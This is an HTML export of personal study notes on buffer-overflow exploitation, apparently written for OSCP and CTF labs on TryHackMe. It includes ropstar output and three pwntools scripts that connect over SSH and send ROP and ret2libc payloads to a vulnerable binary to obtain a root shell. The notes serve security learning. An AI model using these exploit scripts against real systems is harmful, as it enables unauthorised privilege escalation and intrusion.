<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Memory Exploitation</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Memory Exploitation</h1><br/><p>[Memory 1-4]</p><p><h1>Buffer Overflow (BoF)</h1></p><p><h2>Automated Exploitation (ropstar)</h2></p><p>The <a href="https://github.com/xct/ropstar">ropstar</a> tool on Github can automatically analyze &amp; exploit vulnerable binaries. It may be able to bypass defenses like ASLR (Address Space Layour Randomization) &amp; NX (No Execute).</p><p></p><p><span style="color:#f66151;text-decoration:underline;">WARNING</span>: May not be allowed on <strong><span style="text-decoration:underline;">OSCP</span></strong> due to auto exploitation (idk). <a href="Misc_Attacks--Memory_Exploitation_75.html#PwnTools">PwnTools</a> should be fine though?</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Running &gt;1</span>: May need to run it multiple times to successfully exploit the binary.</p><p></p><p><h3>Setup</h3></p><p>Use <a href="Exploit_Research_3.html#python venv">Python Venv</a> to install &amp; run.</p><p></p><p><strong>{Optional}</strong> Test a local copy of the binary after giving it execute permissions (<strong>chmod +x</strong>).</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: BoF exploitation may cause crashes. Setting aside Kernel Exploitation, is there a <span style="color:#ff0000;">risk of my whole system crashing? </span>Or just the ropstar tool &amp; the binary it&#39;s testing?</p><p></p><p><h3>Running on Target</h3></p><p>Provides optional args for<strong> -rhost</strong> &amp; <strong>-rport</strong>, but unless you figure out a way to serve the binary in an appropriate manner, IDK how that&#39;d work.</p><p></p><p><span class="subheading">Connect via SSH</span>: See the below example.</p><p></p><p><span class="subheading">Static Compilation?</span>: There may be ways to create a <a href="https://stackoverflow.com/questions/39913847/is-there-a-way-to-compile-a-python-application-into-static-binary">Python static binary</a> to get around dependency issues (Havne&#39;t tried them).</p><p></p><p><a name="ropstar Remote BoF"></a><h3>Remote Exploit via SSH</h3></p><p>1st run ropstar to identify key information. Then use that information to create a PoC script that&#39;ll connect to the target &amp; exploit the BoF.</p><p></p><p>If you have the user&#39;s password, you can specify it as an arg for <a href="https://docs.pwntools.com/en/stable/tubes/ssh.html">pwnlib</a> function. I didn&#39;t, so I created SSH keys for the target &amp; transfered it to my machine (then ran <strong>chmod 600</strong>...).</p><p></p><p>For <a href="https://www.aldeid.com/wiki/TryHackMe-Dave-s-Blog">example</a>, the ropstar output contained:</p><p></p><p><strong>[+]</strong><strong><span style="color:#ff0000;"> Offset: 88</span></strong><strong></strong></p><p><strong>[*] Checking for leakless exploitation</strong><strong></strong></p><p><strong>[*] Using local target</strong><strong></strong></p><p><strong>[+] Starting local process &#39;/dev/shm/uid_checker&#39; argv=[b&#39;/dev/shm/uid_checker&#39;] : pid 113398</strong><strong></strong></p><p><strong>[*] Exploit: gets(bss); system(bss)</strong><strong></strong></p><p><strong>[*] Loading gadgets for &#39;/dev/shm/uid_checker&#39;</strong><strong></strong></p><p><strong>[*] 0x0000:        </strong><strong><span style="color:#ff0000;"> 0x400803</span></strong><strong> pop rdi; ret</strong><strong></strong></p><p><strong>    0x0008:         </strong><strong><span style="color:#ff0000;">0x601060</span></strong><strong> [arg0] rdi = 6295648</strong><strong></strong></p><p><strong>    0x0010:         </strong><strong><span style="color:#ff0000;">0x4005b0</span></strong><strong></strong></p><p><strong>    0x0018:         </strong><strong><span style="color:#ff0000;">0x400803</span></strong><strong> pop rdi; ret</strong><strong></strong></p><p><strong>    0x0020:         </strong><strong><span style="color:#ff0000;">0x601060 </span></strong><strong>[arg0] rdi = 6295648</strong><strong></strong></p><p><strong>    0x0028:         </strong><strong><span style="color:#ff0000;">0x400570</span></strong></p><p></p><p><span class="subheading">PoC.py</span>: Run inside ropstar&#39;s Python Venv, so you have access to the pwn library. 1st specify BoF details from ropstar, then connection info, &amp; finally the command to run (i.e. sudo /uid_checker).</p><p></p><p><strong>#!/usr/bin/env python3</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>from pwn import cyclic</strong><strong></strong></p><p><strong>from pwnlib.tubes.ssh import ssh</strong><strong></strong></p><p><strong>from pwnlib.util.packing import p64</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>offset = 88</strong><strong></strong></p><p><strong>payload = cyclic(offset)</strong><strong></strong></p><p><strong>payload += p64(0x400803) # pop rdi; ret</strong><strong></strong></p><p><strong>payload += p64(0x601060) # [arg0] rdi = 6295648</strong><strong></strong></p><p><strong>payload += p64(0x4005b0)</strong><strong></strong></p><p><strong>payload += p64(0x400803) # pop rdi; ret</strong><strong></strong></p><p><strong>payload += p64(0x601060) # [arg0] rdi = 6295648</strong><strong></strong></p><p><strong>payload += p64(0x400570)</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>s = ssh(host=&#39;blog.thm&#39;, user=&#39;dave&#39;, keyfile=&#39;/dev/shm/dave.ssh&#39;)</strong><strong></strong></p><p><strong>p = s.process([&#39;sudo&#39;, &#39;/uid_checker&#39;])</strong><strong></strong></p><p><strong>print(p.recv())</strong><strong></strong></p><p><strong>p.sendline(payload)</strong><strong></strong></p><p><strong>print(p.recv())</strong><strong></strong></p><p><strong>p.sendline(&quot;/bin/sh&quot;)</strong><strong></strong></p><p><strong>p.interactive()</strong></p><p></p><p><a name="PwnTools"></a><h2>Using pwntools Framework</h2></p><p><a href="https://docs.pwntools.com/en/stable/">PwnTools</a> can help you analyze binaries &amp; perform Memory Exploitation. See this <a href="https://www.orangewhispers.com/posts/obscure/">CTF Writeup</a> or this <a href="https://0xrodon.medium.com/tryhackme-obscure-walkthrough-obscure-ctf-e2eb82ff5245">CTF Writeup</a> for examples.</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Note</span>: I installed pwntools inside the Venv for <a href="file:///home/asura/git/ropstar">ropstar</a>.</p><p></p><p><a name="pwntools Cyclic"></a><h3>Cyclic Module</h3></p><p>[CTF D 31-32]</p><p></p><p>Example writeups includes using <a href="https://docs.pwntools.com/en/stable/util/cyclic.html">cyclic</a> module, but the syntax is different for my config. For example, run <strong>python3</strong> for interactive prompt</p><p></p><p><strong>from pwn import *</strong></p><p></p><p>#Generate Bytes / Characters</p><p><strong>cyclic(256)</strong></p><p></p><p>#Analyze Hex for Offset (e.g. 136 bytes)</p><p><strong>cyclic_find(0x6261616a)</strong></p><p></p><p><a name="pwntools remote BoF"></a><h3>Remote BoF via SSH</h3></p><p>You can connect to target using SSH, letting you run the script locally to exploit the binary remotely for a reverse shell.</p><p></p><p>The following 2 examples are different ways to do the same things.</p><p></p><p><span class="subheading">Example 1</span></p><p><strong>#!/usr/bin/python</strong><strong></strong></p><p><strong>from pwn import *</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong># Path to your private key<strong></strong></p><p><strong>private_key_path = ‘/path/to/id_rsa’</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>elf = context.binary = ELF(“./exploit_me”, checksec=False)</strong><strong></strong></p><p><strong>libc = elf.libc</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong># Connect via SSH using the private key for authentication<strong></strong></p><p><strong>s = ssh(host=”10.10.92.187&quot;, user=”zeeshan”, keyfile=private_key_path)</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong># Run the binary on the remote host<strong></strong></p><p><strong>p = s.run(“/exploit_me”)</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong># Prepare the payload<strong></strong></p><p><strong>prefix = b”a” * 40</strong><strong></strong></p><p><strong>pop_rdi = p64(next(elf.search(asm(“pop rdi; ret”))))</strong><strong></strong></p><p><strong>go_gets = p64(elf.got.gets)</strong><strong></strong></p><p><strong>go_puts = p64(elf.got.puts)</strong><strong></strong></p><p><strong>fn_puts = p64(elf.plt.puts)</strong><strong></strong></p><p><strong>fn_main = p64(elf.symbols.main)</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>payload = (prefix + pop_rdi + go_gets + fn_puts + pop_rdi + go_puts + fn_puts + fn_main)</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong># Send the payload and receive the response<strong></strong></p><p><strong>p.clean()</strong><strong></strong></p><p><strong>p.sendline(payload)</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong># Read addresses from the response<strong></strong></p><p><strong>gets_addr = u64(p.recvline().strip().ljust(8, b’\x00&#39;))</strong><strong></strong></p><p><strong>puts_addr = u64(p.recvline().strip().ljust(8, b’\x00&#39;))</strong><strong></strong></p><p><strong>print(“Gets : “ + hex(gets_addr)[-5:])</strong><strong></strong></p><p><strong>print(“Puts : “ + hex(puts_addr)[-5:])</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong># Calculate the addresses for system and /bin/sh<strong></strong></p><p><strong>offset = gets_addr — 0x6ed90 </strong># address found on libc.rip after first execution<strong></strong></p><p><strong>bin_sh = p64(offset + 0x18ce57) </strong># address of “/bin/sh”<strong></strong></p><p><strong>system = p64(offset + 0x453a0) </strong># address of “system”<strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong># Prepare the final payload<strong></strong></p><p><strong>payload = prefix + pop_rdi + bin_sh + system</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong># Send the final payload<strong></strong></p><p><strong>p.clean()</strong><strong></strong></p><p><strong>p.sendline(payload)</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong></strong># Interact with the shell<strong></strong></p><p><strong>p.interactive()</strong></p><p></p><p><span class="subheading">Example 2</span></p><p><strong>from pwn import *</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>elf = ELF(‘/home/kali/tmp/exploit_me’)</strong><strong></strong></p><p><strong>elf.address = 0x400000</strong><strong></strong></p><p><strong>context.binary = elf</strong><strong></strong></p><p><strong>libc = ELF(‘/home/kali/tmp/libc.so.6’)</strong><strong></strong></p><p><strong>rop = ROP([elf])</strong><strong></strong></p><p><strong>PUTS_PLT = elf.plt[‘puts’]</strong><strong></strong></p><p><strong>MAIN_PLT = elf.symbols[‘main’]</strong><strong></strong></p><p><strong>PUTS_GOT = elf.got[‘puts’]</strong><strong></strong></p><p><strong>POP_RDI = (rop.find_gadget([‘pop rdi’, ‘ret’]))[0]</strong><strong></strong></p><p><strong>RET = (rop.find_gadget([‘ret’]))[0]</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>s = ssh(user=’zeeshan’, host=’10.10.92.187&#39;, keyfile=’/home/kali/tmp/id_rsa’)</strong><strong></strong></p><p><strong>r = s.process(‘/./exploit_me’)</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>payload = cyclic(40) + p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>r.sendlineafter(‘Exploit this binary for root!\n’, payload) </strong># String present in binary<strong></strong></p><p><strong>leak = int.from_bytes(r.read(6), ‘little’)</strong><strong></strong></p><p><strong>libc.address = leak — libc.symbols[‘puts’]</strong><strong></strong></p><p><strong>print(hex(leak))</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>BINSH = next(libc.search(b’/bin/sh’))</strong><strong></strong></p><p><strong>SYSTEM = libc.sym[‘system’]</strong><strong></strong></p><p><strong>EXIT = libc.sym[‘exit’]</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>rop = ROP([libc])</strong><strong></strong></p><p><strong>rop.execve(BINSH, 0, 0)</strong><strong></strong></p><p><strong>print(rop.dump())</strong><strong></strong></p><p><strong>payload = cyclic(40) + rop.chain()</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>r.sendlineafter(‘Exploit this binary for root!\n’, payload)</strong><strong></strong></p><p><strong></strong><strong></strong></p><p><strong>r.interactive()</strong></p><p></p><p><h2>Manual Exploitation (GDB)</h2></p><p>[CTF D 29-32]</p><p></p><p>(gdb) <strong>set disable-randomization on</strong></p><p>(gdb) <strong>p win</strong></p><p>$1 = {&lt;text variable, no debug info&gt;} <span style="color:#ff0000;">0x400646</span> &lt;win&gt;</p><p>(gdb) <strong>info address win</strong></p><p>Symbol &quot;win&quot; is at <span style="color:#ff0000;">0x400646</span> in a file compiled without debugging.</p><p>(gdb) <strong>q</strong></p><p></p><p><h3>Additional Functionality (GDB)</h3></p><p><a href="https://github.com/pwndbg/pwndbg">Pwndbg</a> is a Python module which is loaded directly into GDB which adds extra functionality for Reverse Engineering &amp; Exploit Development.</p><p></p><p>If you see people running fancy commands in GDB that doesn&#39;t work in your GDB instance, it&#39;s probably because they setup Pwndbg.</p></div>
</body>
</html>
